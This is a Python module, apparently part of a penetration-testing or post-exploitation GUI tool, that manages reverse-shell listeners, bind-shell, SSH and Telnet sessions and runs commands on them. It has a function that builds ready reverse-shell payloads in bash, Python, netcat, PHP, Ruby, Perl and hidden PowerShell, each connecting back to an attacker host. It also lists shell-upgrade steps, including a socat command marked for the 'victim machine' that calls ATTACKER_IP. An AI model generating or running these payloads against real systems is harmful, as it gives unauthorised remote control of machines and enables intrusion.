# app/core/shell_manager.py
import os
import socket
import subprocess
import threading
import time
import paramiko
from typing import Dict, List, Optional, Tuple, Any

# Handle telnetlib availability (removed in Python 3.13+)
try:
    import telnetlib
    TELNET_AVAILABLE = True
except ImportError:
    TELNET_AVAILABLE = False
    telnetlib = None
from PyQt6.QtCore import QObject, pyqtSignal, QTimer
from app.core.security_manager import security_manager
from app.core.logger import logger

class ShellSession:
    """Represents an active shell session"""
    
    def __init__(self, session_id: str, shell_type: str, target: str, 
                 connection_info: Dict, process=None, client=None):
        self.session_id = session_id
        self.shell_type = shell_type
        self.target = target
        self.connection_info = connection_info
        self.process = process
        self.client = client
        self.created_at = time.time()
        self.last_activity = time.time()
        self.status = "active"
        self.command_history = []
        self.output_buffer = []
        self.is_interactive = True
        
    def update_activity(self):
        """Update last activity timestamp"""
        self.last_activity = time.time()
        
    def add_command(self, command: str, output: str = ""):
        """Add command to history"""
        self.command_history.append({
            'command': command,
            'output': output,
            'timestamp': time.time()
        })
        self.update_activity()
        
    def get_session_info(self) -> Dict:
        """Get session information"""
        return {
            'session_id': self.session_id,
            'shell_type': self.shell_type,
            'target': self.target,
            'connection_info': self.connection_info,
            'created_at': self.created_at,
            'last_activity': self.last_activity,
            'status': self.status,
            'command_count': len(self.command_history),
            'uptime': time.time() - self.created_at
        }

class ShellManager(QObject):
    """Advanced shell management system"""
    
    # Signals
    session_established = pyqtSignal(str, dict)  # session_id, session_info
    session_terminated = pyqtSignal(str, str)    # session_id, reason
    command_executed = pyqtSignal(str, str, str) # session_id, command, output
    shell_output = pyqtSignal(str, str)          # session_id, output
    status_changed = pyqtSignal(str, str)        # session_id, status
    
    def __init__(self):
        super().__init__()
        self.sessions: Dict[str, ShellSession] = {}
        self.listeners: Dict[str, Dict] = {}
        self.session_counter = 0
        self.monitoring_timer = QTimer()
        self.monitoring_timer.timeout.connect(self._monitor_sessions)
        self.monitoring_timer.start(5000)  # Check every 5 seconds
        
    def create_reverse_shell_listener(self, port: int, shell_type: str = "netcat") -> str:
        """Create a reverse shell listener"""
        listener_id = f"listener_{port}_{int(time.time())}"
        
        try:
            if shell_type == "netcat":
                # Start netcat listener
                process = subprocess.Popen(
                    ["nc", "-nvlp", str(port)],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
            elif shell_type == "socat":
                # Start socat listener
                process = subprocess.Popen(
                    ["socat", f"TCP-LISTEN:{port},reuseaddr,fork", "EXEC:/bin/bash"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
            else:
                # Python socket listener
                process = self._create_python_listener(port)
                
            self.listeners[listener_id] = {
                'port': port,
                'shell_type': shell_type,
                'process': process,
                'created_at': time.time(),
                'status': 'listening'
            }
            

            
            logger.info(f"Reverse shell listener created on port {port}")
            return listener_id
            
        except Exception as e:
            logger.error(f"Failed to create listener: {e}")
            raise
            
    def _create_python_listener(self, port: int):
        """Create Python-based socket listener"""
        def listener_thread():
            try:
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server_socket.bind(('0.0.0.0', port))
                server_socket.listen(1)
                
                logger.info(f"Python listener waiting for connection on port {port}")
                
                while True:
                    client_socket, addr = server_socket.accept()
                    logger.info(f"Reverse shell connection from {addr}")
                    
                    # Create session for incoming connection
                    session_id = self._generate_session_id()
                    session = ShellSession(
                        session_id=session_id,
                        shell_type="reverse_shell",
                        target=f"{addr[0]}:{addr[1]}",
                        connection_info={'address': addr[0], 'port': addr[1]},
                        client=client_socket
                    )
                    
                    self.sessions[session_id] = session
                    self.session_established.emit(session_id, session.get_session_info())
                    
                    # Start handling the connection
                    threading.Thread(
                        target=self._handle_reverse_shell,
                        args=(session_id, client_socket),
                        daemon=True
                    ).start()
                    
            except Exception as e:
                logger.error(f"Listener error: {e}")
                
        thread = threading.Thread(target=listener_thread, daemon=True)
        thread.start()
        return thread
        
    def establish_ssh_connection(self, host: str, port: int, username: str, 
                               password: str = None, key_file: str = None) -> str:
        """Establish SSH connection"""
        session_id = self._generate_session_id()
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if key_file:
                client.connect(host, port, username, key_filename=key_file)
            else:
                client.connect(host, port, username, password)
                
            session = ShellSession(
                session_id=session_id,
                shell_type="ssh",
                target=f"{host}:{port}",
                connection_info={
                    'host': host,
                    'port': port,
                    'username': username,
                    'auth_method': 'key' if key_file else 'password'
                },
                client=client
            )
            
            self.sessions[session_id] = session
            self.session_established.emit(session_id, session.get_session_info())
            
            logger.info(f"SSH connection established to {host}:{port}")
            return session_id
            
        except Exception as e:
            logger.error(f"SSH connection failed: {e}")
            raise
            
    def establish_telnet_connection(self, host: str, port: int = 23) -> str:
        """Establish Telnet connection"""
        if not TELNET_AVAILABLE:
            raise Exception("Telnet not available in Python 3.13+. Use SSH or raw socket connection instead.")
            
        session_id = self._generate_session_id()
        
        try:
            client = telnetlib.Telnet(host, port, timeout=10)
            
            session = ShellSession(
                session_id=session_id,
                shell_type="telnet",
                target=f"{host}:{port}",
                connection_info={'host': host, 'port': port},
                client=client
            )
            
            self.sessions[session_id] = session
            self.session_established.emit(session_id, session.get_session_info())
            
            logger.info(f"Telnet connection established to {host}:{port}")
            return session_id
            
        except Exception as e:
            logger.error(f"Telnet connection failed: {e}")
            raise
            
    def create_bind_shell(self, host: str, port: int) -> str:
        """Connect to a bind shell"""
        session_id = self._generate_session_id()
        
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))
            
            session = ShellSession(
                session_id=session_id,
                shell_type="bind_shell",
                target=f"{host}:{port}",
                connection_info={'host': host, 'port': port},
                client=client_socket
            )
            
            self.sessions[session_id] = session
            self.session_established.emit(session_id, session.get_session_info())
            
            logger.info(f"Bind shell connection established to {host}:{port}")
            return session_id
            
        except Exception as e:
            logger.error(f"Bind shell connection failed: {e}")
            raise
            
    def execute_command(self, session_id: str, command: str) -> Dict:
        """Execute command in shell session"""
        if session_id not in self.sessions:
            return {"success": False, "error": "Session not found"}
            
        session = self.sessions[session_id]
        
        try:
            if session.shell_type == "ssh":
                return self._execute_ssh_command(session, command)
            elif session.shell_type == "telnet":
                return self._execute_telnet_command(session, command)
            elif session.shell_type in ["reverse_shell", "bind_shell"]:
                return self._execute_socket_command(session, command)
            else:
                return {"success": False, "error": "Unsupported shell type"}
                
        except Exception as e:
            logger.error(f"Command execution failed: {e}")
            return {"success": False, "error": str(e)}
            
    def _execute_ssh_command(self, session: ShellSession, command: str) -> Dict:
        """Execute command via SSH"""
        try:
            stdin, stdout, stderr = session.client.exec_command(command)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            
            full_output = output + error if error else output
            session.add_command(command, full_output)
            
            self.command_executed.emit(session.session_id, command, full_output)
            
            return {
                "success": True,
                "output": full_output,
                "command": command
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
            
    def _execute_telnet_command(self, session: ShellSession, command: str) -> Dict:
        """Execute command via Telnet"""
        if not TELNET_AVAILABLE:
            return {"success": False, "error": "Telnet not available in Python 3.13+"}
            
        try:
            session.client.write(f"{command}\n".encode('ascii'))
            output = session.client.read_until(b"$", timeout=5).decode('utf-8', errors='ignore')
            
            session.add_command(command, output)
            self.command_executed.emit(session.session_id, command, output)
            
            return {
                "success": True,
                "output": output,
                "command": command
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
            
    def _execute_socket_command(self, session: ShellSession, command: str) -> Dict:
        """Execute command via socket connection"""
        try:
            session.client.send(f"{command}\n".encode())
            
            # Read response with timeout
            session.client.settimeout(5)
            output = session.client.recv(4096).decode('utf-8', errors='ignore')
            
            session.add_command(command, output)
            self.command_executed.emit(session.session_id, command, output)
            
            return {
                "success": True,
                "output": output,
                "command": command
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
            
    def _handle_reverse_shell(self, session_id: str, client_socket):
        """Handle reverse shell connection"""
        session = self.sessions.get(session_id)
        if not session:
            return
            
        try:
            while session.status == "active":
                try:
                    client_socket.settimeout(1)
                    data = client_socket.recv(1024)
                    if not data:
                        break
                        
                    output = data.decode('utf-8', errors='ignore')
                    session.output_buffer.append(output)
                    self.shell_output.emit(session_id, output)
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    logger.error(f"Error handling reverse shell: {e}")
                    break
                    
        finally:
            self.terminate_session(session_id, "Connection lost")
            
    def terminate_session(self, session_id: str, reason: str = "User terminated"):
        """Terminate a shell session"""
        if session_id not in self.sessions:
            return False
            
        session = self.sessions[session_id]
        session.status = "terminated"
        
        try:
            if session.shell_type == "ssh" and session.client:
                session.client.close()
            elif session.shell_type == "telnet" and session.client:
                session.client.close()
            elif session.shell_type in ["reverse_shell", "bind_shell"] and session.client:
                session.client.close()
                
        except Exception as e:
            logger.error(f"Error closing session: {e}")
            
        self.session_terminated.emit(session_id, reason)
        del self.sessions[session_id]
        
        logger.info(f"Session {session_id} terminated: {reason}")
        return True
        
    def get_active_sessions(self) -> List[Dict]:
        """Get list of active sessions"""
        return [session.get_session_info() for session in self.sessions.values() 
                if session.status == "active"]
                
    def get_session_info(self, session_id: str) -> Optional[Dict]:
        """Get information about specific session"""
        session = self.sessions.get(session_id)
        return session.get_session_info() if session else None
        
    def get_session_history(self, session_id: str) -> List[Dict]:
        """Get command history for session"""
        session = self.sessions.get(session_id)
        return session.command_history if session else []
        
    def _generate_session_id(self) -> str:
        """Generate unique session ID"""
        self.session_counter += 1
        return f"shell_{self.session_counter}_{int(time.time())}"
        
    def _monitor_sessions(self):
        """Monitor session health and cleanup dead sessions"""
        current_time = time.time()
        dead_sessions = []
        
        for session_id, session in self.sessions.items():
            # Check for inactive sessions (no activity for 30 minutes)
            if current_time - session.last_activity > 1800:
                dead_sessions.append((session_id, "Inactive timeout"))
                
        for session_id, reason in dead_sessions:
            self.terminate_session(session_id, reason)
            
    def generate_reverse_shell_payload(self, shell_type: str, lhost: str, lport: int) -> str:
        """Generate reverse shell payload"""
        payloads = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'nc': f"nc -e /bin/sh {lhost} {lport}",
            'nc_mkfifo': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        }
        
        return payloads.get(shell_type, f"# Unknown shell type: {shell_type}")
        
    def get_shell_upgrade_commands(self) -> Dict[str, List[str]]:
        """Get shell upgrade commands for better TTY"""
        return {
            'python_pty': [
                "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "export TERM=xterm",
                "# Press Ctrl+Z",
                "stty raw -echo",
                "fg",
                "# Press Enter twice"
            ],
            'python3_pty': [
                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "export TERM=xterm",
                "# Press Ctrl+Z", 
                "stty raw -echo",
                "fg",
                "# Press Enter twice"
            ],
            'script_pty': [
                "script -qc /bin/bash /dev/null",
                "export TERM=xterm",
                "# Press Ctrl+Z",
                "stty raw -echo",
                "fg"
            ],
            'socat_upgrade': [
                "# On attacker machine:",
                f"socat file:`tty`,raw,echo=0 tcp-listen:4444",
                "# On victim machine:",
                "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444"
            ]
        }

# Global shell manager instance
shell_manager = ShellManager()